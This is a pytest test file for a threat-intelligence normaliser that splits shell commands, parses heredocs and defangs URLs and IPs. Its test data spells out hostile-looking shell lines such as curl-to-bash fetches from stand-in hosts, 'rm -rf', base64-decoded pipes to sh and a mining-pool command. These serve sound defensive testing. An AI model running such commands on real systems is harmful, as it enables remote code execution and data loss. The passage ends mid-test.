"""Regression tests for crafted input to normalize.py. Synthetic values only."""

import base64
import gc
import hashlib
import json
import random
import subprocess
import sys
import time

import pytest

from interlinear_cti.normalize import (
    MAX_LINE,
    defang,
    is_plain_heredoc_write,
    join_logical_lines,
    normalize_text,
    replace_blobs,
    split_commands,
)

BS = "\\"
SQ = "'"
FILLER = [f"echo step{k}; curl -s http://evil.example.com/s{k}.sh | bash" for k in range(120)]


def sha(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


# A synthetic Kubernetes service-account JWT: header.payload.signature, base64url, with no "/" anywhere.
JWT = ".".join([
    b64url(json.dumps({"alg": "RS256", "kid": "k1"}).encode()),
    b64url(json.dumps({
        "iss": "kubernetes/serviceaccount", "kubernetes.io/serviceaccount/namespace": "default",
        "kubernetes.io/serviceaccount/secret.name": "default-token-abcde",
        "kubernetes.io/serviceaccount/service-account.name": "default",
        "kubernetes.io/serviceaccount/service-account.uid": "00000000-0000-0000-0000-000000000000",
        "sub": "system:serviceaccount:default:default"}).encode()),
    b64url(bytes(range(256))),
])


def separate(lines: list[str], first: int) -> list[tuple[int, str]]:
    """The logical lines expected when every line stands alone, numbered from `first`."""
    return [(first + k, line) for k, line in enumerate(lines)]


# 1. Heredocs


@pytest.mark.parametrize("opener", [
    "tr a-z A-Z <<< hello",
    "base64 -d <<< ZWNobyBoaQ== | sh",
    'cat <<< "word"',
    "mask=$((1<<n))",
    "echo $(( 1 << 4 ))",
    "echo 'a<<b'",
    'echo "a<<b"',
    "# cat <<EOF",
    "cat <<ZZZ",
])
def test_here_strings_quotes_arithmetic_and_unterminated_heredocs_consume_nothing(opener):
    assert join_logical_lines([opener, *FILLER]) == separate([opener, *FILLER], 1)


def test_terminated_heredoc_with_a_hyphenated_delimiter_leaves_the_rest_alone():
    out = join_logical_lines(["cat <<END-OF-FILE > /tmp/x", "body", "END-OF-FILE", *FILLER])
    assert out == [(1, "cat <<END-OF-FILE > /tmp/x\nbody\nEND-OF-FILE"), *separate(FILLER, 4)]


@pytest.mark.parametrize(("opener", "delimiter"), [
    ("cat <<END-OF-FILE", "END-OF-FILE"),
    ("cat <<'EOF'", "EOF"),
    ('cat <<"EOF"', "EOF"),
    ("cat <<" + BS + "EOF > /tmp/x", "EOF"),
    ("cat << EOF", "EOF"),
    ("cat <<E'O'F", "EOF"),
    ("cat <<EOF|sh", "EOF"),
])
def test_heredoc_delimiter_is_the_whole_word_after_quote_removal(opener, delimiter):
    lines = [opener, "rm -rf /tmp/y; id", delimiter, "id"]
    assert join_logical_lines(lines) == [(1, f"{opener}\nrm -rf /tmp/y; id\n{delimiter}"), (4, "id")]


def test_plain_heredoc_ends_only_at_an_exact_terminator():
    lines = ["cat <<EOF", "  EOF", "still body", "EOF", "id"]
    assert join_logical_lines(lines) == [(1, "cat <<EOF\n  EOF\nstill body\nEOF"), (5, "id")]


def test_dash_heredoc_strips_leading_tabs_only():
    lines = ["cat <<-EOF", "\tbody", "  EOF", "\t\tEOF", "id"]
    assert join_logical_lines(lines) == [(1, "cat <<-EOF\n\tbody\n  EOF\n\t\tEOF"), (5, "id")]


def test_two_heredocs_on_one_line_consume_their_bodies_in_order():
    lines = ["cat <<A <<B", "B", "A", "b; whoami", "B", "id"]
    assert join_logical_lines(lines) == [(1, "cat <<A <<B\nB\nA\nb; whoami\nB"), (6, "id")]


def test_an_unterminated_second_heredoc_consumes_only_the_first_body():
    lines = ["cat <<A <<B", "a", "A", "id"]
    assert join_logical_lines(lines) == [(1, "cat <<A <<B\na\nA"), (4, "id")]


def test_comment_after_a_semicolon_opens_no_heredoc():
    lines = ["id;#<<exit", "id", "rm -rf /tmp/x", "exit"]
    assert join_logical_lines(lines) == separate(lines, 1)


def test_ansi_c_quotes_hide_a_heredoc_operator():
    lines = ["echo $'" + BS + SQ + "<<exit " + BS + SQ + "'", "id", "rm -rf /tmp/x", "exit"]
    assert join_logical_lines(lines) == separate(lines, 1)


@pytest.mark.parametrize("opener", ["cat <<#x", "cat << #x"])
def test_heredoc_word_starting_with_an_unquoted_hash_opens_nothing(opener):
    # The # starts a comment, so the heredoc has no word; bash rejects the line.
    lines = [opener, "id", "#x", "ls"]
    assert join_logical_lines(lines) == separate(lines, 1)


@pytest.mark.parametrize("opener", ["cat <<-#x <<ZZ", "cat << #x <<ZZ", "cat <<#x <<ZZ"])
def test_a_hash_heredoc_word_ends_the_scan(opener):
    # bash reads the rest of the line as a comment, so the later <<ZZ opens nothing either.
    lines = [opener, "echo HIDDEN-RAN", "ZZ"]
    assert join_logical_lines(lines) == separate(lines, 1)


@pytest.mark.parametrize("opener", ["cat <<'#x'", "cat <<" + BS + "#x", 'cat <<"#x"'])
def test_heredoc_word_with_a_quoted_hash_still_opens(opener):
    assert join_logical_lines([opener, "id", "#x", "ls"]) == [(1, f"{opener}\nid\n#x"), (4, "ls")]


@pytest.mark.parametrize("opener", ["(( m = 1<<exit ))", "(( x = 1<<exit )); echo hi"])
def test_an_arithmetic_command_opens_no_heredoc(opener):
    # Checked against bash: << inside (( )) is a shift, so bash runs id and then fails on exit as a command.
    lines = [opener, "id", "exit"]
    assert join_logical_lines(lines) == separate(lines, 1)


# Seconds a timing sample lasts at least. On a fully loaded machine, a much shorter sample can run between two
# preemptions while the longer one cannot, which inflates the ratio; about 20 ms spans more than one scheduler tick.
MIN_SAMPLE = 0.02


def sample(fn, arg, reps=1):
    """Seconds per fn(arg) over reps calls, with garbage collection off while timing, as timeit does. Returns
    (seconds, the last result)."""
    collecting = gc.isenabled()
    gc.disable()
    try:
        start = time.perf_counter()
        for _ in range(reps):
            result = fn(arg)
        return (time.perf_counter() - start) / reps, result
    finally:
        if collecting:
            gc.enable()


def scales_linearly(fn, make, size, ceiling):
    """Run fn on make(size) and make(4 * size), and check that the larger takes less than 8 times as long: linear code
    takes about 4 times as long, quadratic code about 16 times. A ratio, unlike an absolute bound, holds on a busy
    machine. Short samples are repeated to last about MIN_SAMPLE, the same number of times at both sizes, and the sizes
    take turns, five samples each, keeping each one's best, so both see the same load. The ceiling, in seconds for the
    larger input and far above what linear code needs, is only a sanity guard. Returns the
    result for the larger input."""
    small, large = make(size), make(4 * size)
    reps = max(1, min(50, int(MIN_SAMPLE / max(sample(fn, small)[0], 1e-6))))
    small_time = large_time = float("inf")
    for _ in range(5):
        small_time = min(small_time, sample(fn, small, reps)[0])
        seconds, result = sample(fn, large, reps)
        large_time = min(large_time, seconds)
    assert large_time < ceiling, (small_time, large_time)
    assert large_time < 8 * small_time, (small_time, large_time)
    return result


def test_many_unterminated_heredocs_join_in_linear_time():
    out = scales_linearly(join_logical_lines, lambda n: [f"cat <<Z{k}" for k in range(n)], 3_125, ceiling=20.0)
    assert len(out) == 12_500


# 2. Line continuations


def test_even_trailing_backslashes_do_not_continue():
    lines = ["echo C:" + BS * 2, "curl -s http://203.0.113.5/x | bash"]
    assert join_logical_lines(lines) == separate(lines, 1)


def test_odd_trailing_backslashes_continue():
    assert join_logical_lines(["echo C:" + BS * 3, "  next"]) == [(1, "echo C:" + BS * 2 + " next")]


def test_even_trailing_backticks_do_not_continue_powershell():
    lines = ["Write-Host ``", "Get-Process"]
    assert join_logical_lines(lines, continuation="`") == separate(lines, 1)


@pytest.mark.parametrize("comment", ["# note " + BS, "   # note " + BS])
def test_comment_lines_never_continue(comment):
    out = join_logical_lines([comment, "curl -s http://203.0.113.5/x | bash"])
    assert out == [(1, comment.strip()), (2, "curl -s http://203.0.113.5/x | bash")]


def test_a_line_with_an_inline_comment_never_continues():
    lines = ["echo a # note " + BS, "id; rm -rf /tmp/x"]
    assert join_logical_lines(lines) == separate(lines, 1)


def test_joining_many_continuations_is_linear():
    out = scales_linearly(join_logical_lines, lambda n: ["a" * 98 + " " + BS] * n, 3_125, ceiling=20.0)
    assert len(out) == 1
    assert len(out[0][1]) == 12_500 * 99 + 1


# 3. split_commands


def test_split_never_splits_inside_a_comment():
    assert split_commands("echo a # comment; rm -rf /tmp/x") == ["echo a # comment; rm -rf /tmp/x"]
    assert split_commands("# id; whoami && ls") == ["# id; whoami && ls"]


def test_split_treats_hash_inside_words_and_quotes_as_text():
    assert split_commands("echo a#b; id") == ["echo a#b", "id"]
    assert split_commands("echo '# x'; id") == ["echo '# x'", "id"]
    assert split_commands("echo ${#x}; id") == ["echo ${#x}", "id"]
    assert split_commands("curl hxxp://a[.]b/#top; id") == ["curl hxxp://a[.]b/#top", "id"]


def test_split_ends_a_command_at_a_background_ampersand():
    assert split_commands("sleep 1 & id; whoami") == ["sleep 1 &", "id", "whoami"]


@pytest.mark.parametrize("blank", ["\u00a0", "\x0b", "\x0c", "\u2003"])
def test_hash_after_a_character_bash_does_not_treat_as_blank_is_not_a_comment(blank):
    assert split_commands(f"echo a{blank}# x; rm -rf /tmp/x") == [f"echo a{blank}# x", "rm -rf /tmp/x"]


@pytest.mark.parametrize(("text", "expected"), [
    ("echo a;# x; rm -rf /tmp/x", ["echo a", "# x; rm -rf /tmp/x"]),
    ("echo a|# x; rm -rf /tmp/x", ["echo a|# x; rm -rf /tmp/x"]),
    ("echo a&# x; rm -rf /tmp/x", ["echo a&", "# x; rm -rf /tmp/x"]),  # the & also ends a background job
    # Over-reports rm (bash sees a comment): a ) that closes $( ) does not end a word, so no ) may start a comment.
    ("(id)# x; rm -rf /tmp/x", ["(id)# x", "rm -rf /tmp/x"]),
    ("echo a\t# x; rm -rf /tmp/x", ["echo a\t# x; rm -rf /tmp/x"]),
])
def test_hash_after_a_shell_metacharacter_starts_a_comment(text, expected):
    assert split_commands(text) == expected


@pytest.mark.parametrize(("text", "first"), [
    ("echo $(echo a)#x; rm -rf /tmp/x", "echo $(echo a)#x"),
    ("echo $((1+2))#x; rm -rf /tmp/x", "echo $((1+2))#x"),
    ("cat <(echo a)#x; rm -rf /tmp/x", "cat <(echo a)#x"),
])
def test_hash_after_a_closing_substitution_is_not_a_comment(text, first):
    # Checked against bash 5.3: the ) that closes $( ), $(( )) or <( ) does not end the word, and rm runs.
    assert split_commands(text) == [first, "rm -rf /tmp/x"]


@pytest.mark.parametrize(("text", "expected"), [
    ("echo " + BS + ";# x; rm -rf /tmp/x", ["echo " + BS + ";# x", "rm -rf /tmp/x"]),
    ("echo a" + BS + " # x; rm -rf /tmp/x", ["echo a" + BS + " # x", "rm -rf /tmp/x"]),
])
def test_hash_after_an_escaped_metacharacter_is_not_a_comment(text, expected):
    # Checked against bash 5.3: the escaped character belongs to the word, so the # is mid-word.
    assert split_commands(text) == expected


def test_split_respects_ansi_c_quotes():
    assert split_commands("echo $'" + BS + SQ + "'; rm -rf /tmp/x") == ["echo $'" + BS + SQ + "'", "rm -rf /tmp/x"]
    # An escaped $ leaves an ordinary single-quoted string, in which a backslash escapes nothing.
    assert split_commands("echo " + BS + "$'a" + BS + "'; id") == ["echo " + BS + "$'a" + BS + "'", "id"]


def test_double_dollar_opens_no_ansi_c_quoting():
    # $$ is the shell's PID, so its second $ opens nothing (bash runs rm); a third $ does open ANSI-C quoting.
    pid_then_quote = "echo $$'" + BS + "'"
    assert split_commands(pid_then_quote + "; rm -rf /tmp/x") == [pid_then_quote, "rm -rf /tmp/x"]
    pid_then_ansi_c = "echo $$$'" + BS + SQ + "'"
    assert split_commands(pid_then_ansi_c + "; rm -rf /tmp/x") == [pid_then_ansi_c, "rm -rf /tmp/x"]


# 4. defang


@pytest.mark.parametrize(("text", "expected"), [
    # any scheme, a glued prefix, and userinfo
    ("xhttp://evil.example.com/a", "xhxxp://evil.example[.]com/a"),
    ("curl -Lhttp://evil.example.com/a", "curl -Lhxxp://evil.example[.]com/a"),
    ("curl HTTP://evil.example.com/x", "curl hxxp://evil.example[.]com/x"),
    ("./xmrig -o stratum+tcp://pool.example.com:4444", "./xmrig -o stratum+tcp://pool.example[.]com:4444"),
    ("curl ftp://files.example.com/x", "curl ftp://files.example[.]com/x"),
    ("wscat -c ws://c2.example.com/s", "wscat -c ws://c2.example[.]com/s"),
    ("curl --proxy socks5h://proxy.example.com:1080 x", "curl --proxy socks5h://proxy.example[.]com:1080 x"),
    ("git clone git://repo.example.com/x", "git clone git://repo.example[.]com/x"),
    ("curl http://user@evil.example.lol/x", "curl hxxp://user@evil.example[.]lol/x"),
    ("curl http://u:p@203.0.113.5/x", "curl hxxp://u:p@203.0.113[.]5/x"),
    ("<blob sha256=00 len=204>://evil.example.com/x", "<blob sha256=00 len=204>://evil.example[.]com/x"),
    # URL hosts followed by punctuation
    ("(curl http://evil.example.com)", "(curl hxxp://evil.example[.]com)"),
    ('bash -c "$(curl -fsSL http://evil.example.com)"', 'bash -c "$(curl -fsSL hxxp://evil.example[.]com)"'),
    ("curl http://evil.example.com|sh", "curl hxxp://evil.example[.]com|sh"),
    ("curl -s http://evil.example.com>/tmp/x", "curl -s hxxp://evil.example[.]com>/tmp/x"),
    ("see http://evil.example.com, then", "see hxxp://evil.example[.]com, then"),
    ("wget `echo http://evil.example.com`", "wget `echo hxxp://evil.example[.]com`"),
    ("I will fetch http://evil.example.com.", "I will fetch hxxp://evil.example[.]com."),
    ("curl http://evil.example.com./x", "curl hxxp://evil.example[.]com./x"),
    # IPv4 glued to option letters, or before a final period
    ("mysql -h203.0.113.5 -uroot -p", "mysql -h203.0.113[.]5 -uroot -p"),
    ("redis-cli -h198.51.100.7 -p 6379", "redis-cli -h198.51.100[.]7 -p 6379"),
    ("curl -x203.0.113.5:3128 http://a/", "curl -x203.0.113[.]5:3128 hxxp://a/"),
    ("I will scan 203.0.113.5.", "I will scan 203.0.113[.]5."),
    ("nc ip_203.0.113.5 1", "nc ip_203.0.113[.]5 1"),
    # bare domains glued to option letters, or before a final period
    ("mysql -hdb.example.com -uroot", "mysql -hdb.example[.]com -uroot"),
    ("nslookup evil.example.com.", "nslookup evil.example[.]com."),
    # the full IANA list
    ("nslookup c2.example.boats", "nslookup c2.example[.]boats"),
    ("nslookup c2.example.mom", "nslookup c2.example[.]mom"),
    ("dig evil.example.lol", "dig evil.example[.]lol"),
    ("dig evil.example.dev", "dig evil.example[.]dev"),
    ("dig evil.example.sbs", "dig evil.example[.]sbs"),
])
def test_defang_closes_hosts_earlier_passes_missed(text, expected):
    assert defang(text) == expected


@pytest.mark.parametrize(("text", "expected"), [
    # after "//", "*.", ",." and "..."
    ("smbclient //evil.example.com/share", "smbclient //evil.example[.]com/share"),
    ("mount -t cifs //evil.example.com/share /mnt", "mount -t cifs //evil.example[.]com/share /mnt"),
    ("certbot certonly -d *.evil.example.com", "certbot certonly -d *.evil.example[.]com"),
    ("export no_proxy=localhost,.corp.example.com", "export no_proxy=localhost,.corp.example[.]com"),
    ("echo connecting...evil.example.com", "echo connecting...evil.example[.]com"),
    ("echo connecting...203.0.113.5", "echo connecting...203.0.113[.]5"),
    # underscores inside labels
    ("nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.example.com",
     "nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.example[.]com"),
    ("curl http://my_host.evil.example.com/x", "curl hxxp://my_host.evil.example[.]com/x"),
    ("curl ftp://my_host.evil.example.com/x", "curl ftp://my_host.evil.example[.]com/x"),
    # several @ in the userinfo, and a single slash after the scheme
    ("curl http://a@b@evil.example.zip/x", "curl hxxp://a@b@evil.example[.]zip/x"),
    ("curl http:/evil.example.com/a", "curl hxxp:/evil.example[.]com/a"),
    ("curl HTTPS:/evil.example.com/a", "curl hxxps:/evil.example[.]com/a"),
])
def test_defang_closes_more_hosts_earlier_passes_missed(text, expected):
    assert defang(text) == expected


@pytest.mark.parametrize("text", [
    "tool --version 1.2.3.4.5", "python3.10 -V", "cat /etc/hosts.allow /tmp/a.sh /usr/lib/x.so.1",
    "ls /var/www/site.online/index.html", "cp ./build/app.live ../out/",
])
def test_versions_and_plain_file_paths_are_left_alone(text):
    assert defang(text) == text


def test_userinfo_stops_at_the_query_so_the_real_host_is_defanged():
    query = "&".join(f"r{k}=u{k}@m{k}.zip" for k in range(4))
    once = defang(f"curl 'https://evil-login.web.app?{query}'")
    defanged_query = "&".join(f"r{k}=u{k}@m{k}[.]zip" for k in range(4))
    assert once == f"curl 'hxxps://evil-login.web[.]app?{defanged_query}'"
    assert defang(once) == once
    # A backslash ends the authority too, as browsers read it.
    once = defang("curl https://evil-login.web.app" + BS + "@corp.example.com/")
    assert once == "curl hxxps://evil-login.web[.]app" + BS + "@corp.example[.]com/"


@pytest.mark.parametrize(("text", "expected"), [
    ("mail user@evil.example.zip", "mail user@evil.example[.]zip"),
    ("ssh admin@host.example.app", "ssh admin@host.example[.]app"),
    ("scp x deploy@build.example.sh:/srv/", "scp x deploy@build.example[.]sh:/srv/"),
])
def test_domain_after_an_at_sign_is_defanged_even_with_an_extension_tld(text, expected):
    assert defang(text) == expected


@pytest.mark.parametrize("prefix", ["curl http://user:", "curl http://"])
def test_host_after_a_blob_userinfo_is_defanged_even_with_an_extension_tld(prefix):
    run = "A" * 200
    out = normalize_text(prefix + run + "@evil.example.zip/x")
    assert out.endswith(f"<blob sha256={sha(run)} len=200>@evil.example[.]zip/x")


@pytest.mark.parametrize("text", ["Read @install.sh and @exploit.py, then @README.md", "'@build.sh'", "@x.py"])
def test_at_file_mentions_stay_readable(text):
    # AI coding agents reference files as @path, so an @ that follows no local part does not make a host.
    assert defang(text) == text


def test_known_residual_a_file_name_with_an_at_is_defanged():
    # Known residual: an @ after a word character reads as user@host, so this file name is over-defanged.
    assert defang("unzip -l bundle@v2.zip") == "unzip -l bundle@v2[.]zip"


@pytest.mark.parametrize("text", [
    "bash install.sh", "python3 tool.py", "perl x.pl", "rustc main.rs", "cat README.md", "unzip a.zip",
    "ffplay a.mov", "open Foo.app", "g++ a.cc", "ldd libx.so", "lpr a.ps", "qmake a.pro", "javac Main.java",
])
def test_tlds_that_double_as_file_extensions_are_left_alone(text):
    assert defang(text) == text


@pytest.mark.parametrize("text", ["cat key.pub", "kill $(cat /run/x.pid)", "perl -MLib.pm", "expand a.cab"])
def test_pub_pid_pm_and_cab_extensions_are_left_alone(text):
    assert defang(text) == text


def test_tld_list_is_the_iana_ascii_list_minus_file_extensions():
    from interlinear_cti.normalize import EXTENSION_TLDS, TLDS
    from interlinear_cti.tlds import IANA_TLDS, IANA_VERSION

    assert IANA_VERSION.startswith("Version ")
    assert {"com", "boats", "mom", "lol", "dev", "top"} <= TLDS
    assert all(tld == tld.lower() and tld.isascii() and not tld.startswith("xn--") for tld in IANA_TLDS)
    assert TLDS == IANA_TLDS - EXTENSION_TLDS


FRAGMENTS = ["http://", "https://", "hxxp://", "HTTP://", "ftp://", "stratum+tcp://", "://", "1.2.3.4", "203.0.113.5",
             "0.", "5.", ".com", ".lol", ".io", "[.]", "::", "[:]", ":", "2001", "db8", "evil", "example", "a", "ab",
             "x", "/", "@", "u:p@", "-", "-h", ")", "(", ".", " ", "_", "'", "|", ",", "//", ":/", "http:/", "..",
             "*", "_a", "a_", "a@b@", "?", "#", "&", ".local"]


def test_defang_is_idempotent_on_random_fragments():
    rng = random.Random(20261015)
    for _ in range(5000):
        text = "".join(rng.choice(FRAGMENTS) for _ in range(rng.randint(1, 10)))
        once = defang(text)
        assert defang(once) == once, text


# 5. Blobs must not eat a host


def test_blob_after_an_ip_url_keeps_the_host_visible():
    payload = "QUFB" * 50
    out = normalize_text("curl http://203.0.113.5/" + payload)
    assert out == f"curl hxxp://203.0.113[.]5/<blob sha256={sha(payload)} len=200>"


def test_blob_after_a_domain_url_keeps_the_host_visible():
    payload = "a" * 200
    out = normalize_text("curl http://evil.example.com/" + payload)
    assert out == f"curl hxxp://evil.example[.]com/<blob sha256={sha(payload)} len=200>"


def test_blob_that_swallows_a_scheme_leaves_no_live_host():
    blob = "A" * 200 + "http"
    out = normalize_text("A" * 200 + "http://evil.example.com/x")
    assert out == f"<blob sha256={sha(blob)} len=204>://evil.example[.]com/x"


@pytest.mark.parametrize(("prefix", "blob"), [
    ("echo user@", "A" * 250),
    ("echo key:", "A" * 250),
    ("echo x.", "A" * 100 + "/" + "B" * 200),
])
def test_blob_after_a_host_character_without_a_near_slash_is_hashed(prefix, blob):
    # No "/" within 64 characters means a credential (JWT segment, bearer token), not a host, so hash all of it.
    assert replace_blobs(prefix + blob) == f"{prefix}<blob sha256={sha(blob)} len={len(blob)}>"


@pytest.mark.parametrize("template", [
    "kubectl --token={} get secrets -A",
    "curl -H 'Authorization: Bearer {}' https://10.96.0.1/api",
])
def test_jwt_segments_stay_hashed(template):
    out = normalize_text(template.format(JWT))
    for segment in JWT.split(".")[1:]:
        assert segment not in out
        assert f"<blob sha256={sha(segment)} len={len(segment)}>" in out


def test_blob_after_a_scheme_keeps_the_scheme_and_defangs_the_host():
    run = "A" * 200
    out = normalize_text("curl http://" + run + ".evil.example.com/x")
    assert out == f"curl hxxp://<blob sha256={sha(run)} len=200>.evil.example[.]com/x"


def test_blob_inside_a_host_with_a_short_rest_is_left_alone():
    text = "curl evil.example.com/" + "a" * 199
    assert replace_blobs(text) == text


# 6. Lone surrogates


def test_scrub_surrogates_replaces_every_surrogate_code_point():
    from interlinear_cti.normalize import scrub_surrogates

    assert scrub_surrogates("a\ud800b\udbffc\udc00d\udfff") == "a\ufffdb\ufffdc\ufffdd\ufffd"
    assert scrub_surrogates("plain \U0001f600 text") == "plain \U0001f600 text"


def test_normalize_text_survives_a_lone_surrogate_on_a_long_line():
    out = normalize_text("echo \ud800" + " x" * 3000)
    assert out.startswith("echo \ufffd x x")
    assert "<truncated len=6006 sha256=" in out


# Standard library only


def test_normalize_imports_only_the_standard_library():
    code = ("import sys\n"
            "before = set(sys.modules)\n"
            "import interlinear_cti.normalize\n"
            "new = {name.split('.')[0] for name in set(sys.modules) - before}\n"
            "print(sorted(new - set(sys.stdlib_module_names) - {'interlinear_cti'}))\n")
    result = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "[]"


# 6. Leading-zero octets, bracketed IPv6, wide dots, www. hosts and URLs glued to user@ hosts


@pytest.mark.parametrize("text, expected", [
    # Octets of 1 to 4 digits with leading zeros, which ipaddress rejects but many tools accept.
    ("nc 203.0.113.05 4444", "nc 203.0.113[.]05 4444"),
    ("ping 0203.0.113.5", "ping 0203.0.113[.]5"),
    ("ping 203.000.0113.0005", "ping 203.000.0113[.]0005"),
    ("curl http://203.0.113.05/x", "curl hxxp://203.0.113[.]05/x"),
    # Not an address: an octet over 255, or a version string.
    ("ping 203.0.113.0256", "ping 203.0.113.0256"),
    ("version 1.2.3.1234 and 2026.10.18.1", "version 1.2.3.1234 and 2026.10.18.1"),
])
def test_dotted_quads_with_leading_zeros_are_defanged(text, expected):
    assert defang(text) == expected


@pytest.mark.parametrize("text, expected", [
    ("curl hxxp://[2001:db8::1]:8080/x", "curl hxxp://[2001[:]db8[:][:]1]:8080/x"),
    ("curl http://[2001:db8::1]/x", "curl hxxp://[2001[:]db8[:][:]1]/x"),
    ("ssh -p 22 root@[2001:db8::5]", "ssh -p 22 root@[2001[:]db8[:][:]5]"),
    ("nc [fe80::1%eth0] 22", "nc [fe80[:][:]1%eth0] 22"),
    ("curl http://[::ffff:203.0.113.5]:80/", "curl hxxp://[[:][:]ffff[:]203.0.113[.]5]:80/"),
    ("echo ${a[1:2]} [ab:cd]", "echo ${a[1:2]} [ab:cd]"),  # not addresses
])
def test_bracketed_ipv6_hosts_are_defanged(text, expected):
    assert defang(text) == expected


IDEOGRAPHIC_DOT, FULLWIDTH_DOT, HALFWIDTH_DOT = chr(0x3002), chr(0xFF0E), chr(0xFF61)


@pytest.mark.parametrize("dot", [IDEOGRAPHIC_DOT, FULLWIDTH_DOT, HALFWIDTH_DOT], ids=["3002", "FF0E", "FF61"])
def test_a_host_joined_by_fullwidth_dots_is_defanged(dot):
    # IDNA reads these as dots, so a browser resolves evil<dot>example<dot>com as evil.example.com. The host is
    # defanged like a dotted host, so its domain IOC extracts like one.
    assert defang("curl http://evil" + dot + "example" + dot + "com/x") == "curl hxxp://evil.example[.]com/x"
    assert defang("nslookup evil" + dot + "example" + dot + "com") == "nslookup evil.example[.]com"
    assert defang("bash install" + dot + "sh") == "bash install.sh"  # a file name stays one
    prose = "echo " + chr(0x30C6) + chr(0x30B9) + chr(0x30C8) + dot + chr(0x6B21)  # Japanese text keeps its dots
    assert defang(prose) == prose


def test_www_names_a_host_even_with_an_extension_tld():
    assert defang("open www.evil-test.zip now") == "open www.evil-test[.]zip now"
    assert defang("WWW.evil-test.mov") == "WWW.evil-test[.]mov"
    assert defang("bash install.sh; python3 run.py") == "bash install.sh; python3 run.py"  # file names stay
    assert defang("cat www.sh") == "cat www.sh"  # a file named www.sh: no host label before the TLD


@pytest.mark.parametrize("text", [
    "hxxp://a.b.zipuser@mail.evil-test.x",
    "175.99.152.207hxxp://evil-test.xuser@mail.evil-test.io",
    "evil-test.io2001:db8::4hxxp://evil-test.iouser@mail.evil-test.io",
    "l-test.coevil-test.ziphxxp://evil-test.zip)user@mail.evil-test.co",
    # A chain of five user@ hosts: with a pass per @ it would outrun the four-pass limit, so a second defang would
    # change it.
    "2001:db8::4-a.evil-test.x1.comuser@mail.evil-test.orgx1.a.a.example-bank.apph" + "ttp://evil-test.zipuser@mail."
    "evil-test.comuser@mail.evil-test.xuser@mail.evil-test.shuser@mail.evil-test.io",
])
def test_defang_is_idempotent_on_urls_glued_to_text(text):
    # A URL glued to user@host with no separator. A later pass reads the same userinfo and host as the first, even
    # once the host after @ holds [.], so a chain of user@ settles without needing a pass per @.
    once = defang(text)
    assert defang(once) == once


@pytest.mark.parametrize("make", [
    lambda n: "hxxp://" + "a[.]" * (n // 4) + "a[",  # a URL host that already holds [.], then cannot end
    lambda n: "hxxp://" + "a.a@" * (n // 4) + "!",  # a userinfo with an @ per label
    lambda n: "0203." * (n // 5),  # four-digit octets that never make a quad
    lambda n: "[" + "0:" * (n // 2),  # an IPv6 bracket that never closes
    lambda n: ("a" + chr(0x3002)) * (n // 2),  # labels joined by ideographic full stops
], ids=["defanged-url-host", "userinfo-ats", "four-digit-octets", "open-bracket", "wide-dots"])
def test_glued_host_patterns_defang_in_linear_time(make):
    scales_linearly(defang, make, 10_000, ceiling=20.0)


def test_defang_is_idempotent_on_glued_random_hosts():
    rng = random.Random(20261018)
    tlds = ["com", "net", "co", "io", "org", "zip", "sh", "app", "evil-test", "x"]
    pieces = [
        lambda: ".".join(rng.choice(["a", "login", "cdn", "x1"]) for _ in range(rng.randint(1, 4))) + "."
        + rng.choice(tlds),
        lambda: ".".join(str(rng.randint(0, 255)).zfill(rng.choice([1, 2, 3, 4])) for _ in range(4)),
        lambda: "hxxp://a.b." + rng.choice(tlds) + "/p",
        lambda: "h" + "ttp://" + rng.choice(["evil-test", "a.b"]) + "." + rng.choice(tlds),
        lambda: "2001:db8::" + str(rng.randint(1, 9)), lambda: "[2001:db8::" + str(rng.randint(1, 9)) + "]",
        lambda: "user@mail.evil-test." + rng.choice(tlds), lambda: "www.evil-test." + rng.choice(tlds),
        lambda: rng.choice(["word", "[.]", "(", ")", ",", "...", "-", "/tmp/x.sh", chr(0x3002), chr(0xFF0E)]),
    ]
    for _ in range(3000):
        text = rng.choice([" ", "", ".", ","]).join(rng.choice(pieces)() for _ in range(rng.randint(2, 12)))
        once = defang(text)
        assert defang(once) == once, text


# 7. Multi-line strings, substitutions, arrays and continued pipelines

UNCLOSED = "a quote or bracket in the command starting here never closes"
TOO_DEEP = "quotes and brackets nest more than 64 deep"


@pytest.mark.parametrize("lines", [
    ['echo "a ' + BS + '" b', 'c"'],  # an escaped double quote does not close the string
    ["echo $'a " + BS + SQ + " b", "c'"],  # nor does an escaped quote in $'...'
    ["echo `date", "`"],
    ['echo "$(printf "%s" "it' + SQ + 's")', '"'],  # quotes nest in $( ) inside double quotes, so this ' is text
    ["x=$(", "  id", ")"],
    ["x=$(( 1 +", "  2 ))"],
    ["diff <(", "  ls a) b"],
    ["a+=(", "  one # a comment", "  two", ")"],
    ['echo "a', "", "b" + BS, '"'],  # a blank line, and a backslash before the newline, stay in the string
    ["x=$(echo " + SQ + "a", SQ + ")"],
    ["sh -c " + SQ, "cd /tmp", "ls", SQ],  # an sh -c body goes whole to the model, as a heredoc body does
])
def test_an_open_quote_or_bracket_joins_lines_until_it_closes(lines):
    assert join_logical_lines([*lines, "id"]) == [(1, "\n".join(lines)), (len(lines) + 1, "id")]


@pytest.mark.parametrize("line", [
    "echo " + SQ + "a" + BS + SQ,  # a backslash escapes nothing inside single quotes
    "echo a # it" + SQ + "s",  # a quote in a comment opens nothing
    "# don" + SQ + "t",
    "echo a;# " + '"',
    "echo " + BS + '"a',  # an escaped quote opens nothing
    "(cd /tmp",  # a subshell's lines stay apart, as before
    "f() {",  # and so do a function's
])
def test_lines_that_open_no_string_or_substitution_stay_apart(line):
    lines = [line, "id", "ls"]
    assert join_logical_lines(lines) == separate(lines, 1)


def test_quotes_inside_a_heredoc_body_open_nothing():
    lines = ["cat <<EOF", "it" + SQ + "s", 'a "b', "EOF", "id"]
    assert join_logical_lines(lines) == [(1, "\n".join(lines[:4])), (5, "id")]


def test_a_heredoc_operator_inside_a_string_opens_nothing():
    lines = ['echo "a', "cat <<EOF", '"', "id", "EOF"]
    assert join_logical_lines(lines) == [(1, "\n".join(lines[:3])), (4, "id"), (5, "EOF")]


def test_a_heredoc_body_starts_after_the_line_that_closes_the_string():
    lines = ['cat <<EOF; echo "a', 'b"', "body", "EOF", "id"]
    assert join_logical_lines(lines) == [(1, "\n".join(lines[:4])), (5, "id")]


@pytest.mark.parametrize("lines", [
    ["body=$(cat <<EOF", "hello", "EOF", ")"],
